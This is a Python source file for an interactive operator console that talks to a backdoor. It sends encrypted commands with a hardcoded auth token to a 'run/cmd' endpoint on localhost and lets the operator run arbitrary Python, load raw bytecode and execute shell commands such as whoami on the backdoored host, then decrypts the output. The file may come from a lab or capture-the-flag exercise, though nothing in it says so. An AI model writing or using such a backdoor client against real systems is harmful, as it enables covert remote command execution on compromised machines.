import requests
from encryption_utils import decrypt,encrypt
from base64 import b64decode,b64encode
from ast import literal_eval
url = "http://localhost:1337/run/cmd"
secret_key = "GreatBackdoorOutThere11"
HEADERS = {'X-Auth-Token' : secret_key}


def run_cmd(cmd):
    if cmd.startswith('loadByteCode'):
        cmd = 'loadByteCode '+b64encode(literal_eval(cmd.split('loadByteCode')[1])).decode()
    data = {'data' : b64encode(encrypt(cmd, secret_key)).decode()}
    decrypt_key = cmd[0:8].strip().replace(' ','')
    req = requests.post(url,headers=HEADERS,json=data)
    if not req:
        print('Something went wrong with the request', req.__dict__)
        return None
    try:
        req_data = req.json()['results']
    except Exception as e:
        print('[*] Something went wrong',e)
        return None
    try:
        decrypted_result = decrypt(b64decode(req_data),decrypt_key)
    except Exception as e:
        print('[*] Something went wrong with the decryption/decoding!',e)
        return None
    return decrypted_result
while True:
    cmd = input('Enter Command or enter "help" to see possible commands:')
    if cmd == 'help':
        print(r"[Command]: py_run $python_code Example: py_run 2+2, py_run print('\n'.join([i for i in __import__('os').listdir()]))")
        print(r"[Command]: loadByteCode $pythonByteCode Example: loadByteCode b'\xfa\x08print(1)'")
        print("[Command]: $syscommand --> will run with default terminal. Example: whoami")
        continue
    res = run_cmd(cmd)
    if res:
        print(res)


